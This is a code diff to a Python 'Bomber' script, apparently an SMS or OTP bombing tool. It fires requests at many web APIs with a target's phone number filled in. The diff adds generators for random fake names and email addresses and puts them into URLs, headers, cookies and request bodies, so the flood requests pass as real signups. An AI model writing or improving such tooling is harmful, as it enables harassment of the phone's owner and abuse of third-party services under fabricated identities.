@@ -12,9 +12,21 @@ import os
 import copy
 import signal
 import sys
+import random
+import string
 from datetime import datetime
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def generate_random_firstname():
+    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()
+
+def generate_random_lastname():
+    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()
+
+def generate_random_email(firstname, lastname):
+    domains = ["gmail.com", "yahoo.com", "outlook.com", "icloud.com"]
+    return f"{firstname.lower()}{lastname.lower()}{random.randint(10, 9999)}@{random.choice(domains)}"
 
 
 R = "\033[1;31m"
@@ -79,16 +91,16 @@ class Bomber:
             return apis
 
 
-    def build_cookies(self, api, phone):
+    def build_cookies(self, api, phone, firstname, lastname, fullname, email):
         raw_cookies = api.get("cookies", {})
         if isinstance(raw_cookies, dict):
             cookies = copy.deepcopy(raw_cookies)
             for k, v in cookies.items():
-                if isinstance(v, str) and "{phone}" in v:
-                    cookies[k] = v.replace("{phone}", phone)
+                if isinstance(v, str):
+                    cookies[k] = v.replace("{phone}", phone).replace("{firstname}", firstname).replace("{lastname}", lastname).replace("{fullname}", fullname).replace("{email}", email)
             return cookies
         elif isinstance(raw_cookies, str) and raw_cookies.strip():
-            cookie_str = raw_cookies.replace("{phone}", phone)
+            cookie_str = raw_cookies.replace("{phone}", phone).replace("{firstname}", firstname).replace("{lastname}", lastname).replace("{fullname}", fullname).replace("{email}", email)
             cookies = {}
             for part in cookie_str.split(";"):
                 part = part.strip()
@@ -102,24 +114,33 @@ class Bomber:
 
     def send_request(self, api_name, phone):
         api = self.api_data[api_name]
-        url = api["url"].replace("{phone}", phone)
+        
+        firstname = generate_random_firstname()
+        lastname = generate_random_lastname()
+        fullname = f"{firstname} {lastname}"
+        email = generate_random_email(firstname, lastname)
+        
+        def replace_vars(s):
+            if not isinstance(s, str):
+                return s
+            return s.replace("{phone}", phone).replace("{firstname}", firstname).replace("{lastname}", lastname).replace("{fullname}", fullname).replace("{email}", email)
+            
+        url = replace_vars(api["url"])
         method = api.get("method", "GET").upper()
+        
         headers = copy.deepcopy(api.get("headers", {}))
         for k, v in headers.items():
-            if isinstance(v, str) and "{phone}" in v:
-                headers[k] = v.replace("{phone}", phone)
-        cookies = self.build_cookies(api, phone)
+            headers[k] = replace_vars(v)
+            
+        cookies = self.build_cookies(api, phone, firstname, lastname, fullname, email)
+        
         raw_data = api.get("data", {})
         if isinstance(raw_data, dict):
             data = copy.deepcopy(raw_data)
             for k, v in data.items():
-                if isinstance(v, str) and "{phone}" in v:
-                    data[k] = v.replace("{phone}", phone)
+                data[k] = replace_vars(v)
         elif isinstance(raw_data, str):
-            try:
-                data = raw_data.format(phone=phone)
-            except KeyError:
-                data = raw_data.replace("{phone}", phone)
+            data = replace_vars(raw_data)
         else:
             data = raw_data
         status_msg = "[ERROR]"
